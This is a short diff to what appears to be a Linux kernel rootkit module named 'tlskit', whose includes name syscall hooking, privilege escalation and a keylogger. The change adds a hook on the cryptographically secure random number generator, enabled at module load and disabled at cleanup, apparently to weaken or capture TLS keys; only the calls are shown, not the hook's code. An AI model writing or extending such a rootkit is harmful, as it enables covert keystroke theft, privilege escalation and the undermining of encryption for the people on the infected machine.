@@ -10,8 +10,12 @@
 #include "syscall_hooking.h"
 #include "priv_escalation.h"
 #include "keylogger.h"
+#include "csprng.h"
 
 static int cleanup(void *_data) {
+
+    /* Disable CSPRNG hook */
+    disable_csprng_hook();
 
     /* Stop key logger */
     disable_key_logger();
@@ -114,6 +118,8 @@ static int __init tlskit_init(void) {
     }
 
     init_key_logger();
+
+    enable_csprng_hook();
 
     return 0;
 
